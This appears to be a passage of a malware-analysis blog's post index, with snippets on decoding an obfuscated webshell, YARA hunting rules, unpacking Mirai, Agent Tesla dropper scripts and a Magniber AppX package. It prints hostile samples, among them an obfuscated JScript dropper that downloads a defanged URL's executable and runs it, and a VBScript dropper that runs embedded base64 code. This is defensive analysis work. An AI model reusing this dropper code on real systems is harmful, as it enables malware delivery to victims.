100document.documentElement.innerHTML=String.fromCharCode(60, 63, 112, 104, 112, 32, 10, 47, 47, 32, 83In the output we can see the sample contains JavaScript that should execute in a web browser. The document.documentElement object in JavaScript allows you access properties of the standard &amp;lt;html&amp;gt; tag in browsers. The .innerHTML property lets you access the contents of the tag. In this case, the material returned from String.fromCharCode will be set to the contents of the document HTML tags.Decoding the ContentsAlright, there are a few ways we can decode JavaScript, but one of my favorites is using the NodeJS REPL. Remember how in Python you can access a console that lets you specify arbitrary commands that get evaluated? You can do the same thing with NodeJS and it works marvelously. On a system with the NodeJS runtime installed, just execute node or node.exe. I usually analyze JavaScript in Visual Studio Code and have an instance of node running in the terminal that is part of VSCode.In some cases we can copy and paste code directly into the node interface, but this file is about 95KiB in size. If we try pasting that amount of text into the command line we’re going to wait a long time for the command line to catch up and then execute. I’ve learned this the hard way. Instead, let’s make a JS file we can execute with node! This will process much faster than pasting a ton of data to the command line.We can use the fs.writeFileSync() function to write the output of String.fromCharCode to a file on disk.fs = require(&#39;fs&#39;);page = String.fromCharCode(60, 63, 112, 104, 112, 32, ... );fs.writeFileSync(&#39;clearpage.txt&#39;,page)Now we can execute node deobfuscate.js or whatever else your script is named. Afterward, let’s take a look at what kind of file was deobfuscated.remnux@remnux:~/cases/wso$ node deobfuscate.js remnux@remnux:~/cases/wso$ file clearpage.txt clearpage.txt: PHP script, UTF-8 Unicode text, with very long linesremnux@remnux:~/cases/wso$ head -c 25 clearpage.txt &amp;lt;?php // Shell Mr.LutfieAwesome, it looks like we got a PHP file so we can rename it to clearpage.php or something similar for further analysis. This same decoding method also works with JavaScript you might find in Windows malware executing via wscript or cscript. In those cases, the generic JavaScript code structures will be valid inside NodeJS, but Windows-specific structures like ActiveX objects will cause errors.Other Ways to DecodeWhile we’re here, let’s take a look at a couple of methods to verify your decoding worked properly. First, we can use a local web browser. To do this, we can disable our network connection, open Firefox, and open up the the browser developer tools to access its JavaScript console. Then we can paste in the entirety of the encoded webshell from beginning to end.After executing in the console, we can see the page attempt to render in the browser and we can grab the decoded PHP code.Finally, if you love CyberChef, you can also use it to validate your decoding. Copy all the arguments for .fromCharCode into CyberChef and bake using the recipe From Charcode setting the separator to “comma” and base to 10.console.log(&quot;Thanks for reading!&quot;)" }, { "title": "Adventures in YARA Hashing and Entropy", "url": "/adventures-in-yara-hashing-entropy/", "categories": "yara, hashing, entropy", "tags": "", "date": "2022-01-05 00:00:00 +0000", "snippet": "In this post I’m going to take a look at a couple of simple YARA rules that excited me during my daily analysis tasks. These rules were inspired by the #100DaysOfYARA hashtag, and if you’re not following the Twitter hashtag #100DaysOfYARA go ahead and open a new tab so you can preload that joy for reading after this post.Matching on Rich Header HashI’ve talked a bit about rich header hashes here before, and I love using it as a pivot point in VirusTotal. If you’re not familiar, the rich header of a Windows EXE can give you information about the build environment of the binary. If you hash the clear bytes (it’s XOR’d by default), you can use that hash to possibly find binaries that were built with a similar environment or tool chain. When combined with import table hashes, rich header hashes can help you pivot and find intelligence overlaps with known malware samples.By default, there’s no method included with the YARA “pe” module to query the rich header hash of a sample. That’s fine, we can calculate it ourselves!import &quot;pe&quot;import &quot;hash&quot;rule sus_known_bad_rich_hash { meta: description = &quot;Rule to find samples with given rich header md5 hash&quot; author = &quot;Tony Lambert&quot; condition: hash.md5(pe.rich_signature.clear_data) == &quot;fe5854c644d74722b56122fd4bf43115&quot;}In this case, we’re hunting for samples that match the rich header md5 hash fe5854c644d74722b56122fd4bf43115. Yeah, you have to know the bad rich header hash here, but this is just another hunting tool.remnux@remnux:~/cases$ yara -r rich-header-rule.yar ./sus_known_bad_rich_hash .//raccoon/maybe_raccoon.binMatching on Resource EntropyI occasionally run into Windows EXE malware samples that have encrypted resources attached. This is sometimes the case for binaries where shellcode is loaded from a resource or the malware otherwise has something to hide there. With YARA, we can calculate the entropy of resources and identify samples with high entropy resources.import &quot;pe&quot;import &quot;math&quot;rule sus_very_high_entropy_resource{ meta: description = &quot;check for resources with high levels of entropy&quot; condition: for any resource in pe.resources: ( math.in_range( math.entropy( resource.offset, resource.length ), 7.8, 8.0) )}remnux@remnux:~/cases$ yara -r high_entropy_resources.yar ./sus_very_high_entropy_resource .//icedid/gigabyteI7.jpgsus_very_high_entropy_resource .//konni/konni.scrShout-out to @greglesnewich who originally did the same thing with PE sections here:We&amp;#39;re on to day 2 of #100DaysofYARA Looking for super duper high entropies in .text PE sections. New rules on top of zee gist:https://t.co/CHwmpNORpw&amp;mdash; Greg Lesnewich (@greglesnewich) January 2, 2022Thanks for reading, and YARA on!" }, { "title": "Extracting Indicators from a Packed Mirai Sample", "url": "/extracting-indicators-from-packed-mirai/", "categories": "Malware", "tags": "malware, mirai, upx", "date": "2022-01-04 00:00:00 +0000", "snippet": "Packing is really commonly used by adversary to stump analysis, so in this post I’m going to look at a sample that is really easy to unpack and get indicators from. In this case the sample is Mirai packed with UPX. If you want to follow along at home, the sample is in MalwareBazaar here:https://bazaar.abuse.ch/sample/ef11393108bed5f3753d054514b2dddb1a534f3623244ab485c0ed6e2d5ded9e/Why Just Indicators?Malware analysis should serve a purpose. In my dayjob on the Red Canary Intelligence team I sometimes have to assess malware for indicators as parts of incidents. Not every adventure ends in assembly code and not every adventure requires a 50-page report.Identifying UPX PackingFor this Mirai sample, it’s easy to detect the UPX packing with Detect It Easy.remnux@remnux:~/cases/mirai$ diec mirai.elffiletype: ELF32arch: 386mode: 32-bitendianess: LEtype: EXEC packer: UPX(3.96)[NRV,brute]To verify it’s packed with standard UPX, we can look for UPX! (55 50 58 21) in the first few bytes:remnux@remnux:~/cases/mirai$ hexdump -C mirai.elf | head00000000 7f 45 4c 46 01 01 01 03 00 00 00 00 00 00 00 00 |.ELF............|00000010 02 00 03 00 01 00 00 00 08 ba 04 08 34 00 00 00 |............4...|00000020 00 00 00 00 00 00 00 00 34 00 20 00 03 00 28 00 |........4. ...(.|00000030 00 00 00 00 01 00 00 00 00 00 00 00 00 80 04 08 |................|00000040 00 80 04 08 e6 42 00 00 e6 42 00 00 05 00 00 00 |.....B...B......|00000050 00 10 00 00 01 00 00 00 00 00 00 00 00 d0 04 08 |................|00000060 00 d0 04 08 00 00 00 00 20 3c 00 00 06 00 00 00 |........ &amp;lt;......|00000070 00 10 00 00 51 e5 74 64 00 00 00 00 00 00 00 00 |....Q.td........|00000080 00 00 00 00 00 00 00 00 00 00 00 00 06 00 00 00 |................|00000090 04 00 00 00 4c 15 8d 50 55 50 58 21 ec 08 0d 0c |....L..PUPX!....|Also, we can verify with YARA:remnux@remnux:~/cases/mirai$ yara-rules -s mirai.elfUPXProtectorv10x2 mirai.elf0x3a2a:$a0: EB 0E 90 90 90 90 8A 06 46 88 07 47 01 DB 75 07 8B 1E 83 EE FC 11 DBIt’s not unheard of for adversaries to overwrite artifacts of UPX packing or use custom packers, so when you find a sample with standard UPX it’s always time for celebration!Unpacking The SampleIn this case it’s simple to unpack the sample. We’re using upx on REMnux, but we also need to remember that the command will overwrite the original executable. First, we need to create a backup copy.remnux@remnux:~/cases/mirai$ cp mirai.elf mirai.elf.bak remnux@remnux:~/cases/mirai$ upx -d mirai.elf Ultimate Packer for eXecutables Copyright (C) 1996 - 2020UPX 3.96 Markus Oberhumer, Laszlo Molnar &amp;amp; John Reiser Jan 23rd 2020 File size Ratio Format Name -------------------- ------ ----------- ----------- 30908 &amp;lt;- 17376 56.22% linux/i386 mirai.elfUnpacked 1 file.We can verify the result is executable with file and then get our hashes to look up in VT or other sources.remnux@remnux:~/cases/mirai$ file mirai.elfmirai.elf: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, strippedremnux@remnux:~/cases/mirai$ diec mirai.elffiletype: ELF32arch: 386mode: 32-bitendianess: LEtype: EXECremnux@remnux:~/cases/mirai$ md5sum mirai.elf3c246e3a6c146dd823268920918c9b48 mirai.elfLooking for IndicatorsThe quick and easy triage for indicators can happen with strings. Remember, by default it just looks for ASCII and not Unicode, so you need two passes.remnux@remnux:~/cases/mirai$ strings mirai.elf &amp;gt; mirai-strings.txtremnux@remnux:~/cases/mirai$ strings -eL mirai.elf &amp;gt;&amp;gt; mirai-strings.txtExamining the strings output, we can find a couple interesting things: 35.197.127[.]250 /dev/nullFrom here, we can pivot on that IP address as an indicator to see where it leads. We can also possibly look for sandbox reports or execute the malware in a controlled environment. To save some time, I looked into a Joe Sandbox report for the sample. The report included the IP address above plus a few more to try and pivot around. Depending on the requirements for your incident you might also look for obfuscated strings using Ghidra or other tools, but we don’t need to for this case.Thanks for reading!" }, { "title": "A Tale of Two Dropper Scripts for Agent Tesla", "url": "/a-tale-of-two-dropper-scripts/", "categories": "Malware", "tags": "agenttesla, malware, javascript, vbs", "date": "2022-01-03 00:00:00 +0000", "snippet": "In this post I want to look at two script files that drop Agent Tesla stealers on affected systems and show how adversary decisions affect malware analysis and detection. If you want to follow along at home, I’m working with these samples from MalwareBazaar: https://bazaar.abuse.ch/sample/46dd53f3096877a4cad89b77f2d23018d8bc5887a9c0d699cb43ffe9d0b5e29d/ https://bazaar.abuse.ch/sample/ac0517947c0be7baad44fb8f054215c00ada03bb61772bab9eb52e48a9c3a097/The first script (hash starting with 46dd) is crafted with love using obfuscated JavaScript and shows how an adversary made the decision to download subsequent stages rather than embed into the script. The second script (hash starting with ac05) is crafted with care using VBscript and shows another adversary choosing to embed a second stage into the script rather than trying to download more content.Adversary Path - Downloading StagesIn the downloading path, we can see that the script is fairly obfuscated, but brief:var _0x181193=_0x2d0f;(function(_0x2af778,_0x402c31){var _0x2500ec=_0x2d0f,_0x1384b3=_0x2af778();while(!![]){try{var _0x1e4494=-parseInt(_0x2500ec(0x1de))/0x1+parseInt(_0x2500ec(0x1d1))/0x2+-parseInt(_0x2500ec(0x1d5))/0x3+parseInt(_0x2500ec(0x1e0))/0x4*(parseInt(_0x2500ec(0x1db))/0x5)+parseInt(_0x2500ec(0x1cd))/0x6+-parseInt(_0x2500ec(0x1c8))/0x7*(parseInt(_0x2500ec(0x1df))/0x8)+parseInt(_0x2500ec(0x1d2))/0x9*(parseInt(_0x2500ec(0x1d0))/0xa);if(_0x1e4494===_0x402c31)break;else _0x1384b3[&#39;push&#39;](_0x1384b3[&#39;shift&#39;]());}catch(_0x9770c4){_0x1384b3[&#39;push&#39;](_0x1384b3[&#39;shift&#39;]());}}}(_0x4335,0x3a8ff));var WshShell=WScript[_0x181193(0x1d8)](_0x181193(0x1d3)),filepath=WshShell[_0x181193(0x1dd)](&#39;%TEMP%&#39;)+&#39;/rt.exe&#39;,url=_0x181193(0x1cf),xhr=new ActiveXObject(_0x181193(0x1ce));xhr[&#39;open&#39;](_0x181193(0x1d6),url,![]),xhr[_0x181193(0x1da)]();function _0x4335(){var _0x9dcd91=[&#39;2406210dsHjnj&#39;,&#39;693904PWufDQ&#39;,&#39;9vwQAXw&#39;,&#39;WScript.Shell&#39;,&#39;Write&#39;,&#39;237552VRkBbi&#39;,&#39;GET&#39;,&#39;ADODB.Stream&#39;,&#39;CreateObject&#39;,&#39;ResponseBody&#39;,&#39;send&#39;,&#39;345JNNSha&#39;,&#39;Open&#39;,&#39;ExpandEnvironmentStrings&#39;,&#39;254303yqzRYw&#39;,&#39;2192RvXUxf&#39;,&#39;19476TscEAp&#39;,&#39;9646fwwenO&#39;,&#39;SaveToFile&#39;,&#39;Close&#39;,&#39;Type&#39;,&#39;Scripting.FileSystemObject&#39;,&#39;164376qLrHmK&#39;,&#39;MSXML2.XMLHTTP&#39;,&#39;hxxp://mudanzasdistintas[.]com.ar/vvt/td.exe&#39;];_0x4335=function(){return _0x9dcd91;};return _0x4335();}var fso=new ActiveXObject(_0x181193(0x1cc));if(fso[&#39;FileExists&#39;](filepath)==![]){var stream=new ActiveXObject(_0x181193(0x1d7));stream[_0x181193(0x1dc)](),stream[_0x181193(0x1cb)]=0x1,stream[_0x181193(0x1d4)](xhr[_0x181193(0x1d9)]),stream[&#39;Position&#39;]=0x0,stream[_0x181193(0x1c9)](filepath,0x2),stream[_0x181193(0x1ca)]();}function _0x2d0f(_0x27e577,_0x37192f){var _0x43355c=_0x4335();return _0x2d0f=function(_0x2d0ffa,_0x4a32bc){_0x2d0ffa=_0x2d0ffa-0x1c8;var _0x35edeb=_0x43355c[_0x2d0ffa];return _0x35edeb;},_0x2d0f(_0x27e577,_0x37192f);}var shell=WScript[_0x181193(0x1d8)](&#39;WScript.Shell&#39;);shell[&#39;Run&#39;](filepath);We could potentially make this code prettier using a NodeJS REPL but the adversary chose to leave most of the essential stuff in plaintext for us. The strings MSXML2.XMLHTTP and hxxp://mudanzasdistintas[.]com.ar/vvt/td.exe indicate a second stage likely comes from a downloaded executable. The string shell[&#39;Run&#39;] indicates the script likely launches that second stage at th end. While the script is relatively short, the majority of the script contents focus on obfuscation while not actually performing effective obfuscation. Since the adversary chose this route, we can make a few hypotheses: The script is likely smaller The script contains less details about subsequent stages A wscript or cscript process will spawn the downloaded content A wscript or cscript process will establish a network connectionWe can test out these hypotheses using a combination of static analysis and a sandbox report. For file size, we can look at properties using exiftool or filesystem tools like ls.remnux@remnux:~/cases/js-tesla$ exiftool documentos.js ExifTool Version Number : 12.30File Name : documentos.jsDirectory : .File Size : 1917 bytesFile Modification Date/Time : 2022:01:03 17:33:52-05:00File Access Date/Time : 2022:01:03 17:11:34-05:00File Inode Change Date/Time : 2022:01:03 12:36:18-05:00File Permissions : -rw-r--r--File Type : TXTFile Type Extension : txtMIME Type : text/plainMIME Encoding : us-asciiNewlines : (none)Line Count : 1Word Count : 21This script weighs in at 1917 bytes, fairly small. From the Tria.ge sandbox report, we can also confirm wscript.exe makes a network connection and at least one file modification to write the executable.If we’re looking for detection ideas, we could look into analytics that involve wscript.exe making network connections as well as file modifications.Adversary Path - Embedding StagesIn the sample that embeds a payload, we can first see that the script contains a lot of content.on error resume nextdim medo,sea,medoffdim maasrset helper = createobject(&quot;Wscript.Shell&quot;)maasr = helper.ExpandEnvironmentStrings(&quot;%temp%&quot;)set medo = CreateObject(&quot;Msxml2.DOMDocument.3.0&quot;).CreateElement(&quot;base64&quot;)medo.dataType=&quot;bin.base64&quot;medo.text=&quot;TVqQAAMAAAAEAAAA//...AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;set sea= CreateObject(&quot;ADODB.Stream&quot;)sea.Type=1sea.Opensea.Write medo.nodeTypedValuesea.SavetoFile maasr &amp;amp; &quot;\\anyname.exe&quot;,2helper.run(maasr &amp;amp; &quot;\\anyname.exe&quot;)Function tttttttttttttttt ()tttttttttttttttt = chr(104) &amp;amp; chr(101) &amp;amp; chr(114) &amp;amp; chr(111)End functionI’ve included the first and last parts of the script for brevity, but the exiftool output shows a significantly larger size:remnux@remnux:~/cases/tesla$ exiftool TGFTR.vbs ExifTool Version Number : 12.30File Name : TGFTR.vbsDirectory : .File Size : 935 KiBFile Modification Date/Time : 2022:01:02 21:40:36-05:00File Access Date/Time : 2022:01:03 17:27:22-05:00File Inode Change Date/Time : 2022:01:02 16:42:17-05:00File Permissions : -rw-r--r--File Type : TXTFile Type Extension : txtMIME Type : text/plainMIME Encoding : us-asciiNewlines : Windows CRLFLine Count : 17Word Count : 49This script weighs in at 935KiB vs the first script’s 1917 bytes. This size difference is because the adversary chose to encode the second stage in base64 and embed it within the script. In some instances, I’ve seen adversaries embed multiple binaries into a script resulting in script sizes above 1MB. This helps the adversary avoid making network connections to get subsequent stages, but it gives defenders some extra clues. First, large scripts are more suspicious for any defenders that go hunting. Also, the more content adversaries include within their scripts, the more likely they are to trip YARA rules. We can see an example of this with these scripts.remnux@remnux:~/cases/tesla$ yara-rules TGFTR.vbs Base64_encoded_Executable TGFTR.vbsremnux@remnux:~/cases/tesla$ yara-rules ../js-tesla/documentos.jsFor the VBscript containing the embedded stage, YARA detected an encoded Windows EXE. For the JS dropper that didn’t have embedded content, YARA found nothing (although a custom ruleset would work better). For this demonstration I’m using the default YARA rules included with REMnux.An additional issue embedding poses for the adversary: once a malware analyst has the first stage script, they can extract the subsequent versions easily, depending on the level of obfuscation. In this case, I could copy all of the content from TVqQ through the end of the string and paste it into its own file named mal.b64. Then I used base64 -d to decode the file into a Windows EXE.remnux@remnux:~/cases/tesla$ base64 -d mal.b64 &amp;gt; mal.bin remnux@remnux:~/cases/tesla$ file mal.bin mal.bin: PE32 executable (GUI) Intel 80386 Mono/.Net assembly, for MS Windowsremnux@remnux:~/cases/tesla$ hexdump -C mal.bin | head00000000 4d 5a 90 00 03 00 00 00 04 00 00 00 ff ff 00 00 |MZ..............|00000010 b8 00 00 00 00 00 00 00 40 00 00 00 00 00 00 00 |........@.......|00000020 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 |................|00000030 00 00 00 00 00 00 00 00 00 00 00 00 80 00 00 00 |................|00000040 0e 1f ba 0e 00 b4 09 cd 21 b8 01 4c cd 21 54 68 |........!..L.!Th|00000050 69 73 20 70 72 6f 67 72 61 6d 20 63 61 6e 6e 6f |is program canno|00000060 74 20 62 65 20 72 75 6e 20 69 6e 20 44 4f 53 20 |t be run in DOS |00000070 6d 6f 64 65 2e 0d 0d 0a 24 00 00 00 00 00 00 00 |mode....$.......|00000080 50 45 00 00 4c 01 03 00 fe f0 ce 61 00 00 00 00 |PE..L......a....|00000090 00 00 00 00 e0 00 02 01 0b 01 30 00 00 e8 0a 00 |..........0.....|Sure enough, we can see the extracted material is a Windows EXE! If you’re looking for detection ideas for this path, you can focus on the script content itself and use YARA, nework signatures, AV rules, and possibly behavioral analytics like wscript.exe spawning things it just wrote to disk.Thanks for reading!" }, { "title": "Analyzing a Magnitude EK Appx Package Dropping Magniber", "url": "/analyzing-magnitude-magniber-appx/", "categories": "Malware", "tags": "magnitude, malware, magniber, appx", "date": "2022-01-02 00:00:00 +0000", "snippet": "In this post I’ll work through analyzing an AppX package from Magnitude Exploit Kit that drops Magniber. This adventure comes courtesy of a tweet from @JAMESWT_MHT:Some #Magniber sampleshttps://t.co/6XaMq0X2QH https://t.co/wWef0eSk2o&amp;mdash; JAMESWT (@JAMESWT_MHT) January 1, 2022This caught my interest because AppX packages have gotten some mileage as droppers lately courtesy of Bazar and Emotet. https://news.sophos.com/en-us/2021/11/11/bazarloader-call-me-back-attack-abuses-windows-10-apps-mechanism/ https://redcanary.com/blog/intelligence-insights-december-2021/If you want to play along from home, the file I’m analyzing is here: https://bazaar.abuse.ch/sample/da1729efaaa590d66f46d388680ed5b1b956246ababd277e7cdd14f90fbf60fa/Analyzing the AppX PackageTo start off, let’s get a handle on what kind of file an AppX package is. We can do this using file.remnux@remnux:~/cases/magnitude/update$ file edge_update.appx edge_update.appx: Zip archive data, at least v4.5 to extractThe file command says the magic bytes for the file correspond to a zip archive. This is common with application or package archives like AppX, JARs, and more. If we want more confirmation we can always look at the first few bytes with hexdump and head.remnux@remnux:~/cases/magnitude/update$ hexdump -C edge_update.appx | head00000000 50 4b 03 04 2d 00 08 00 00 00 f8 6e 9d 53 00 00 |PK..-......n.S..|00000010 00 00 00 00 00 00 00 00 00 00 26 00 00 00 49 6d |..........&amp;amp;...Im|00000020 61 67 65 73 2f 53 71 75 61 72 65 31 35 30 78 31 |ages/Square150x1|00000030 35 30 4c 6f 67 6f 2e 73 63 61 6c 65 2d 31 35 30 |50Logo.scale-150|00000040 2e 70 6e 67 89 50 4e 47 0d 0a 1a 0a 00 00 00 0d |.png.PNG........|00000050 49 48 44 52 00 00 00 e1 00 00 00 e1 08 06 00 00 |IHDR............|00000060 00 3e b3 d2 7a 00 00 00 09 70 48 59 73 00 00 0e |.&amp;gt;..z....pHYs...|00000070 c3 00 00 0e c3 01 c7 6f a8 64 00 00 71 fc 49 44 |.......o.d..q.ID|00000080 41 54 78 9c ec bd 77 90 25 c7 79 27 f8 65 99 e7 |ATx...w.%.y&#39;.e..|00000090 db 9b e9 ee f1 33 98 19 0c 06 84 77 04 41 18 92 |.....3.....w.A..|Yup, looks like a zip file based on 50 4b 03 04! That means we can unpack the archive using unzip.remnux@remnux:~/cases/magnitude/update$ unzip edge_update.appxArchive: edge_update.appx extracting: Images/Square150x150Logo.scale-150.png extracting: Images/Wide310x150Logo.scale-150.png extracting: Images/SmallTile.scale-150.png extracting: Images/LargeTile.scale-150.png extracting: Images/BadgeLogo.scale-150.png extracting: Images/SplashScreen.scale-150.png extracting: Images/StoreLogo.scale-150.png extracting: Images/Square44x44Logo.targetsize-32.png extracting: Images/Square44x44Logo.altform-unplated_targetsize-32.png extracting: Images/Square44x44Logo.scale-150.png extracting: Images/Square44x44Logo.altform-lightunplated_targetsize-32.png inflating: eediwjus/eediwjus.exe inflating: eediwjus/eediwjus.dll inflating: resources.pri inflating: AppxManifest.xml inflating: AppxBlockMap.xml inflating: [Content_Types].xml inflating: AppxMetadata/CodeIntegrity.cat inflating: AppxSignature.p7xWith the archive unzipped, we can focus on significant files within the package. These are: AppxManifest.xml (list of properties and components used by the AppX package) AppxSignature.p7x (AppX Signature Object, contains code signatures for AppX Package) eediwjus/eediwjus.exe (non-default content that is likely executable) eediwjus/eediwjus.dll (non-default content that is likely executable)First, we can look at the AppxManifest.xml file. I’ve included the points of interest below.&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&amp;gt;&amp;lt;Package xmlns=&quot;http://schemas.microsoft.com/appx/manifest/foundation/windows10&quot; xmlns:uap=&quot;http://schemas.microsoft.com/appx/manifest/uap/windows10&quot; xmlns:rescap=&quot;http://schemas.microsoft.com/appx/manifest/foundation/windows10/restrictedcapabilities&quot; IgnorableNamespaces=&quot;uap rescap build&quot; xmlns:build=&quot;http://schemas.microsoft.com/developer/appx/2015/build&quot;&amp;gt; &amp;lt;Identity Name=&quot;3669e262-ec02-4e9d-bcb4-3d008b4afac9&quot; Publisher=&quot;CN=Foresee Consulting Inc., O=Foresee Consulting Inc., L=North York, S=Ontario, C=CA, SERIALNUMBER=1004913-1, OID.1.3.6.1.4.1.311.60.2.1.3=CA, OID.2.5.4.15=Private Organization&quot; Version=&quot;96.0.1072.0&quot; ProcessorArchitecture=&quot;neutral&quot; /&amp;gt; &amp;lt;Properties&amp;gt; &amp;lt;DisplayName&amp;gt;Edge Update&amp;lt;/DisplayName&amp;gt; &amp;lt;PublisherDisplayName&amp;gt;Microsoft Inc&amp;lt;/PublisherDisplayName&amp;gt; &amp;lt;Logo&amp;gt;Images\\StoreLogo.png&amp;lt;/Logo&amp;gt; &amp;lt;/Properties&amp;gt;... &amp;lt;Applications&amp;gt; &amp;lt;Application Id=&quot;App&quot; Executable=&quot;eediwjus\\eediwjus.exe&quot; EntryPoint=&quot;Windows.FullTrustApplication&quot;&amp;gt; ... &amp;lt;/Application&amp;gt; &amp;lt;/Applications&amp;gt; &amp;lt;Capabilities&amp;gt; &amp;lt;Capability Name=&quot;internetClient&quot; /&amp;gt; &amp;lt;rescap:Capability Name=&quot;runFullTrust&quot; /&amp;gt; &amp;lt;/Capabilities&amp;gt;&amp;lt;/Package&amp;gt;First, let’s take a look at the Identity and Properties sections. Identity contains code signature information that should theoretically be included within the AppxSignature.p7x file. The Properties section contains metadata the Windows Store/Universal Windows App interface uses to identify the app. From the name Edge Update and publisher name Microsoft Inc, it appears the malware wants to masquerade as a Microsoft Edge browser update. Note how there is no link or control between the publisher display name and the actual signing identity. This is a major problem for victims trying to be sure of themselves.The Application section identifies the EXE that will execute when the package is installed and run. In this sample, the EXE is eediwjus.exe. In the package content there is also a DLL, but that isn’t mentioned in the manifest. A possibility to explore might be that the EXE uses content from the DLL for execution.Finally, the Capabilities section shows the app will execute with internetClient and runFullTrust capabilities. Documented by Microsoft, these capabilities just mean the app can download stuff from the Internet. Now we can jump into the executable content, the EXE file.Analyzing the Application ExecutableThe EXE has these hashes:filepath: eediwjus.exemd5: 3439bbe95df314d390cc4862cdad94fdsha1: 92429885d54a05ed87a5c14d34aa504c28ea8b54sha256: ad4f74c0c3ac37e6f1cf600a96ae203c38341d263dbac0741e602686794c4f5assdeep: 48:6/yaz1YKkikwFJSDq6tPRqBHwOul2a3iq:yz1fkigtJkGYKimphash: f34d5f2d4577ed6d9ceec516c1f5a744Note the import table hash starting with f34d. That specific import table hash commonly appears with .NET binaries, so if you pivot on it in VT or other tools, you’ll find a lot of .NET. Using Detect It Easy in REMnux, we can confirm the executable is a .NET binary.remnux@remnux:~/cases/magnitude/update/eediwjus$ diec eediwjus.exe filetype: PE32arch: I386mode: 32-bitendianess: LEtype: GUI library: .NET(v4.0.30319)[-] linker: Microsoft Linker(11.0)[GUI32]So let’s take a peek with floss from Mandiant to see if there are signs of obfuscation. There aren’t any signs of obfuscation like randomized, high-entropy strings, but we do get some interesting strings.mscorlibSystemObjectmhjpfzvittaMain.ctorlpBufferargsSystem.Runtime.VersioningTargetFrameworkAttributeSystem.Security.PermissionsSecurityPermissionAttributeSecurityActionSystem.Runtime.CompilerServicesCompilationRelaxationsAttributeRuntimeCompatibilityAttributeSystem.Runtime.InteropServicesDllImportAttributeeediwjus.dllSure enough, the EXE references the DLL in the same folder, and it includes the string DllImportAttribute. This is a good sign that the EXE will load an unmanaged DLL and call an export from it. Unobfuscated .NET code is usually pretty easy to decompile from bytecode form into source, so we can give that a shot with ilspycmd. If you’re on Windows you can also use ILSpy or DNSpy. The result is a pretty brief source file:using System.Reflection;using System.Runtime.CompilerServices;using System.Runtime.InteropServices;using System.Runtime.Versioning;using System.Security;using System.Security.Permissions;[assembly: TargetFramework(&quot;.NETFramework,Version=v4.5&quot;, FrameworkDisplayName = &quot;.NET Framework 4.5&quot;)][assembly: CompilationRelaxations(8)][assembly: RuntimeCompatibility(WrapNonExceptionThrows = true)][assembly: SecurityPermission(8, SkipVerification = true)][assembly: AssemblyVersion(&quot;0.0.0.0&quot;)][module: UnverifiableCode]namespace eediwjus{ public class eediwjus { [DllImport(&quot;eediwjus.dll&quot;)] private static extern void mhjpfzvitta(uint lpBuffer); private static void Main(string[] args) { uint lpBuffer = 5604u; mhjpfzvitta(lpBuffer); } }}The entry point for the program is the Main function inside the eediwjus class. The DllImport code imports the function mhjpfzvitta() from the DLL and calls it with the argument lpBuffer. That argument contains an unsigned integer value of 5604. lpBuffer appears loads of times in Microsoft documentation around Windows calls like VirtualAlloc and others that need a buffer of memory for operation. It stands to reason that lpBuffer here might correspond to some form of a memory management call.Analyzing the Magniber DLLThe DLL has these hashes:filepath: eediwjus.dllmd5: e7e4878847d31c4de301d3edf7378ecbsha1: a93d0f59b3374c6d3669a5872d44515f056e9dbfsha256: f423bd6daae6c8002acf5c203267e015f7beb4c52ed54a78789dd86ab35e46c6ssdeep: 96:qUG6xykl2J6lc5irN3qjNu47Ru/8IAgecgKDD:qsQMl0u3qjA47RuZAhkOur pehash command didn’t find an import table hash, so that’s interesting. There may not be an import table in this binary or it might be mangled. We can take a look using the Python pefile library.remnux@remnux:~/cases/magnitude/update/eediwjus$ python3Python 3.8.10 (default, Nov 26 2021, 20:14:08) [GCC 9.3.0] on linuxType &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.&amp;gt;&amp;gt;&amp;gt; import pefile&amp;gt;&amp;gt;&amp;gt; bin = pefile.PE(&#39;eediwjus.dll&#39;)&amp;gt;&amp;gt;&amp;gt; bin.get_imphash()&#39;&#39;&amp;gt;&amp;gt;&amp;gt; bin.get_rich_header_hash()&#39;&#39;Sure enough, the binary doesn’t seem to have an import table hash or rich header hash. Maybe those parts don’t exist? We can confirm with pefile again.&amp;gt;&amp;gt;&amp;gt; for directory in bin.OPTIONAL_HEADER.DATA_DIRECTORY:... print(directory)... [IMAGE_DIRECTORY_ENTRY_EXPORT]0x148 0x0 VirtualAddress: 0x2000 0x14C 0x4 Size: 0x4B [IMAGE_DIRECTORY_ENTRY_IMPORT]0x150 0x0 VirtualAddress: 0x0 0x154 0x4 Size: 0x0 ...&amp;gt;&amp;gt;&amp;gt; bin.RICH_HEADER&amp;gt;&amp;gt;&amp;gt; Sure enough, the import table is apparently empty and no rich header exists for the binary. This is slightly unusual, so let’s see if we can run some more commands to find capabilities before jumping further into analysis.The Mandiant tools floss and capa yield nothing significant.+-----------+------------------------------------------------------------------+| md5 | e7e4878847d31c4de301d3edf7378ecb || sha1 | a93d0f59b3374c6d3669a5872d44515f056e9dbf || sha256 | f423bd6daae6c8002acf5c203267e015f7beb4c52ed54a78789dd86ab35e46c6 || path | eediwjus.dll |+-----------+------------------------------------------------------------------+no capabilities foundYara tells us more of what we already know.remnux@remnux:~/cases/magnitude/update/eediwjus$ yara-rules eediwjus.dll IsPE64 eediwjus.dllIsDLL eediwjus.dllIsWindowsGUI eediwjus.dllImportTableIsBad eediwjus.dllHasModified_DOS_Message eediwjus.dllA pedump command gets us some export info. You could also get this with pefile in Python, I just like this output better.=== EXPORTS ===# module 